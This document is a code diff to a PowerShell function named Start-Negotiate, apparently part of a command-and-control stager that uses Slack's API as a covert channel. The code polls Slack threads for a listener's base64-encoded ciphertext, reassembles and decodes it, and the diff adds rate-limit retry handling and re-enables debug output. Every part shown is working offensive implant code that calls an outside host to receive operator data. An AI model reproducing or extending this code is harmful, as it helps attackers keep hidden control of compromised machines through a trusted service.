@@ -177,11 +177,25 @@ function Start-Negotiate {
         $listener_replied=$false;
 
         $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
-        $slack_response2=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
-        $slack_response2=ConvertFrom-Json20 $slack_response2;
-        $reply_count=$($slack_response2["messages"][0]["reply_count"]);
+        try {
+            $slack_response2=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
+            $slack_response2=ConvertFrom-Json20 $slack_response2;
+            $reply_count=$($slack_response2["messages"][0]["reply_count"]);
+        }
+        catch [System.Net.WebException] {
+            #If we're getting rate-limited
+            Write-Host "Waiting....";
+            Write-Host $_;
+            if($_.Response.StatusCode -eq 429) {
+                Start-Sleep -Seconds ($_.Response.Headers.Get("Retry-After")*2);
+            }
+            #Try again and hope for the test
+            else {
+                Start-Sleep -Seconds 5;
+            }
+        };
 
-        #Write-Host "[*] Reply count is $reply_count";
+        Write-Host "[*] Reply count is $reply_count";
 
     }
     #Write-Host "[*] Listener has finished sending the base64 string.";
@@ -195,7 +209,7 @@ function Start-Negotiate {
     $replies = $slack_response2["messages"] | ?{ $_["ts"] -ne $_["thread_ts"] };
     $raw_base64 = $replies["text"];
 
-    #write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
     $raw=Decode-Base64 $raw_base64;
     if($raw) {
         #write-host "[*] cypher text decode from base64";
@@ -304,16 +318,30 @@ function Start-Negotiate {
         $listener_replied=$false;
 
         $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
-        $slack_response=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
-        $slack_response=ConvertFrom-Json20 $slack_response;
+        try {
+            $slack_response=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
+            $slack_response=ConvertFrom-Json20 $slack_response;
 
-        #Write-Host "[*] Reply count is $($slack_response["messages"][0]["reply_count"])";
+            #Write-Host "[*] Reply count is $($slack_response["messages"][0]["reply_count"])";
 
-        $last_message = $slack_response["messages"] | Select -Last 1;
-        if($last_message["text"] -eq "-MESSAGE_END-") {
-            #Write-Host "[*] Listener has finished sending the base64 string.";
-            $listener_replied=$true;
+            $last_message = $slack_response["messages"] | Select -Last 1;
+            if($last_message["text"] -eq "-MESSAGE_END-") {
+                #Write-Host "[*] Listener has finished sending the base64 string.";
+                $listener_replied=$true;
+            }
         }
+        catch [System.Net.WebException] {
+            #If we're getting rate-limited
+            Write-Host "Waiting...";
+            Write-Host $_;
+            if($_.Response.StatusCode -eq 429) {
+                Start-Sleep -Seconds ($_.Response.Headers.Get("Retry-After")*2);
+            }
+            #Try again and hope for the test
+            else {
+                Start-Sleep -Seconds 5;
+            }
+        };
     }
 
     # listener has replied grab all replies
